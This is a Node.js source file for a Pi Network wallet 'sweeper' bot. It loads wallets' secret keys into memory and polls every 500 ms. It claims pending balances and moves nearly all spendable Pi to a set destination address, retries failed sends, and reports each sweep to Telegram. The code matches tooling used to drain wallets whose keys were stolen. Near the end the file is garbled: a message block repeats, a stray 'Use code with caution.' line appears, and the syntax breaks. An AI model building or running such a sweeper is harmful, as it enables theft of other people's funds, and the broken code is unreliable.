'use strict';

const fs = require('fs');
const path = require('path');
const StellarSdk = require('@stellar/stellar-sdk');
const sqlite3 = require('sqlite3').verbose();

const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://minepi.com';
const NETWORK_PASSPHRASE = process.env.STELLAR_NETWORK_PASSPHRASE || 'Pi Network';
const MASTER_DESTINATION = process.env.SWEEP_DESTINATION_ADDRESS || '';
const POLL_INTERVAL_MS = Math.max(10, Number(process.env.SWEEP_POLL_INTERVAL_MS || 500));
const MIN_THRESHOLD = Number(process.env.SWEEP_MIN_THRESHOLD || 0.002);
const DATA_DIR = process.env.DATA_DIR || '/data';

const server = new StellarSdk.Horizon.Server(HORIZON_URL);
const walletLocks = new Set();
let monitorRunning = false;
let monitorTimeoutId = null;

const liveWalletsMap = new Map();

function getErrorDetails(error) {
  if (error?.response?.data?.extras?.result_codes) {
    return JSON.stringify(error.response.data.extras.result_codes);
  }
  return error?.response?.data?.title || error?.message || String(error);
}

function log(level, message, details) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [Sweeper ${level}] ${message}`, details || '');
}

function initDatabase() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  const dbPath = path.join(DATA_DIR, 'sweeper.db');
  const db = new sqlite3.Database(dbPath);
  
  db.serialize(() => {
    db.run('PRAGMA journal_mode = WAL');
    db.run(`
      CREATE TABLE IF NOT EXISTS sweeper_transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        wallet_id TEXT NOT NULL,
        source_address TEXT NOT NULL,
        destination_address TEXT NOT NULL,
        amount TEXT NOT NULL,
        transaction_hash TEXT,
        status TEXT NOT NULL,
        error_details TEXT,
        created_at TEXT NOT NULL
      );
    `);
  });
  return db;
}

const WalletManager = {
  addLiveWallet({ id, publicKey, secretKey, destination, label, chatId, customAmount }) {
    liveWalletsMap.set(String(id), { 
      id, 
      publicKey, 
      secretKey, 
      destination: destination || null, // Volatile dynamic routing placeholder
      label, 
      chatId,
      customAmount: customAmount ? Number(customAmount) : null 
    });
    log('INFO', `Wallet Box #${id} mapped successfully into RAM memory.`);
  },
  
  removeLiveWallet(id) {
    return liveWalletsMap.delete(String(id));
  },

  getLiveWallets() {
    return Array.from(liveWalletsMap.values());
  }
};

async function notifyTelegram(bot, chatId, message) {
  if (!bot || !chatId) return;
  try {
    await bot.sendMessage(chatId, message, { parse_mode: 'HTML', disable_web_page_preview: true });
  } catch (error) {
    log('ERROR', 'Telegram notification failure:', error.message);
  }
}

const SweeperEngine = {
  async autoClaimMoveBalances(publicKey, sourceKeypair, baseFee) {
    try {
      const claimablePage = await server.claimableBalances().claimant(publicKey).call();
      if (!claimablePage.records || claimablePage.records.length === 0) return;

      for (const record of claimablePage.records) {
        try {
          const freshAccount = await server.loadAccount(publicKey);
          const tx = new StellarSdk.TransactionBuilder(freshAccount, {
            fee: String(baseFee * 25), 
            networkPassphrase: NETWORK_PASSPHRASE
          })
          .addOperation(StellarSdk.Operation.claimClaimableBalance({
            balanceId: record.id
          }))
          .setTimeout(10).build();

          tx.sign(sourceKeypair);
          await server.submitTransaction(tx);
          log('INFO', `Auto-Move Trigger Success for balance ID: ${record.id}`);
        } catch (e) {
          continue;
        }
      }
    } catch (err) {
      // Continuous looping safety track
    }
  },

  async evaluateBalance(publicKey) {
    try {
      const account = await server.loadAccount(publicKey);
      const native = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI');
      if (!native) return { spendable: 0, verified: false };

      const ledgerTotal = Number(native.balance || 0);
      let locked = 0;
      if (Object.prototype.hasOwnProperty.call(native, 'locked_balance')) {
        locked = Number(native.locked_balance || 0);
      }
      return { spendable: Math.max(0, ledgerTotal - locked), verified: true };
    } catch (error) {
      return { spendable: 0, verified: false };
    }
  },

  async executeInstantSweep(db, bot, wallet) {
    const id = String(wallet.id);
    if (walletLocks.has(id)) return { status: 'LOCKED' };
    walletLocks.add(id);

    try {
      // 🔥 CRITICAL FALLBACK GUARD CHECK
      const activeDestination = wallet.destination || MASTER_DESTINATION;
      if (!activeDestination) {
        throw new Error('Critical Configuration Fault: No target destination address available.');
      }

      const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secretKey);
      
      let baseFee = 100;
      try { baseFee = await server.fetchBaseFee(); } catch (e) { baseFee = 100; }

      await this.autoClaimMoveBalances(wallet.publicKey, sourceKeypair, baseFee);

      const evalResult = await this.evaluateBalance(wallet.publicKey);
      const currentAvailable = evalResult.verified ? evalResult.spendable : 0;

      // 📢 MESSAGE 1: Continuous Millisecond Search Telemetry Tracker
      await notifyTelegram(bot, wallet.chatId, 
        `🔍 <b>MONITOR CORE LOG</b>\n` +
        `📦 Box ID: #${wallet.id}\n` +
        `💰 Available Balance: <code>${currentAvailable.toFixed(7)} Pi</code>\n` +
        `📡 <i>Status: Scanning pools & executing high-speed sweeps...</i>`
      );

      if (currentAvailable <= MIN_THRESHOLD) {
        await notifyTelegram(bot, wallet.chatId, 
          `⚠️ <b>TRANSFER UNSUCCESSFUL</b>\n` +
          `📦 Box ID: #${wallet.id}\n` +
          `❌ Reason: <code>Coin in available balance has finished / Empty Pool.</code>\n` +
          `🔄 <i>Continuous tracking loop running...</i>`
        );
        return { status: 'POOL_EMPTY' };
      }

      let targetAmount = 0;
      let isFixedStrategy = false;

      if (wallet.customAmount && wallet.customAmount > 0) {
        targetAmount = wallet.customAmount;
        isFixedStrategy = true;
      } else if (currentAvailable > 1.0) {
        targetAmount = currentAvailable - 1.0;
      } else {
        targetAmount = currentAvailable - 0.01;
      }

      if (targetAmount <= 0) {
        return { status: 'POOL_EXHAUSTED' };
      }

      log('INFO', `Executing transaction on Box #${id} for amount: ${targetAmount} Pi.`);

      let success = false, sweptAmount = 0, txHash = '', errorReason = '';

      try {
        const freshAccount = await server.loadAccount(wallet.publicKey);
        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
          fee: String(baseFee * 30), 
          networkPassphrase: NETWORK_PASSPHRASE
        })
        .addOperation(StellarSdk.Operation.payment({
          destination: activeDestination,
          asset: StellarSdk.Asset.native(),
          amount: targetAmount.toFixed(7)
        }))
        .setTimeout(10).build();

        transaction.sign(sourceKeypair);
        const response = await server.submitTransaction(transaction);
        sweptAmount = targetAmount;
        txHash = response.hash;
        success = true;
      } catch (err) {
        errorReason = getErrorDetails(err);
      }

      if (!success && !isFixedStrategy) {
        const microBuffers = [0.001, 0.002, 0.005, 0.01, 0.05, 0.1];
        for (const buffer of microBuffers) {
          const fallbackAmount = currentAvailable - buffer;
          if (fallbackAmount <= 0) continue;

          try {
            const freshAccount = await server.loadAccount(wallet.publicKey);
            const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
              fee: String(baseFee * 10),
              networkPassphrase: NETWORK_PASSPHRASE
            })
            .addOperation(StellarSdk.Operation.payment({
              destination: activeDestination,
              asset: StellarSdk.Asset.native(),
              amount: fallbackAmount.toFixed(7)
            }))
            .setTimeout(15).build();

            transaction.sign(sourceKeypair);
            const response = await server.submitTransaction(transaction);
            sweptAmount = fallbackAmount;
            txHash = response.hash;
            success = true;
            break;
          } catch (err) {
            errorReason = getErrorDetails(err);
            continue;
          }
        }
      }

      const now = new Date().toISOString();
      if (success) {
        const remainingPool = Math.max(0, currentAvailable - sweptAmount);
        db.run(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, transaction_hash, status, created_at) VALUES (?, ?, ?, ?, ?, 'SUCCESS', ?)`, [id, wallet.publicKey, activeDestination, String(sweptAmount), txHash, now]);
        
        await notifyTelegram(bot, wallet.chatId, 
          `🚀 <b>TRANSFER SUCCESSFUL!</b>\n\n` +
          `📦 <b>Box ID:</b> #${wallet.id}\n` +
          `💰 <b>Swept Amount:</b> <code>${sweptAmount.toFixed(7)} Pi</code>\n` +
          `📉 <b>Remaining Pool:</b> <code>${remainingPool.toFixed(7)} Pi</code>\n` +
          `🔗 <b>Tx Hash:</b> <code>${txHash}</code>`
        );
      } else {
        db.run(`INSERT INTO sweeper_transactions (wallet_id, source_address, destination_address, amount, status, error_details, created_at) VALUES (?, ?, ?, '0', 'FAILED', ?, ?)`, [id, wallet.publicKey, activeDestination, errorReason, now]);
        
        await notifyTelegram(bot, wallet.chatId, 
          `⚠️ <b>TRANSFER UNSUCCESSFUL</b>\n` +
          `📦 Box ID: #${wallet.id}\n` +
          `❌ Error Details: <code>${errorReason}</code>\n` +
          `🔄 <i>Retrying operation immediately...</i>`
        );
      }
          `📦 Box ID: #${wallet.id}\n` +
          `❌ Error Details: <code>${errorReason}</code>\n` +
          `🔄 <i>Retrying operation immediately...</i>`
        );
      }
Use code with caution.
} catch (criticalError) {
log('ERROR', Loop Failure on Box #${id}, criticalError.message);
} finally {
walletLocks.delete(id);
}
}
};
function startSweeperEngine(db, bot) {
if (monitorRunning) return;
monitorRunning = true;
const corePollingCycle = async () => {
if (!monitorRunning) return;
try {
const wallets = WalletManager.getLiveWallets();
for (const wallet of wallets) {
await SweeperEngine.executeInstantSweep(db, bot, wallet);
}
} catch (err) {
log('ERROR', 'Loop error context:', err.message);
}
if (monitorRunning) monitorTimeoutId = setTimeout(corePollingCycle, POLL_INTERVAL_MS);
};
corePollingCycle();
}
function stopSweeperEngine() {
monitorRunning = false;
if (monitorTimeoutId) clearTimeout(monitorTimeoutId);
}
module.exports = { initDatabase, WalletManager, startSweeperEngine, stopSweeperEngine, notifyTelegram };
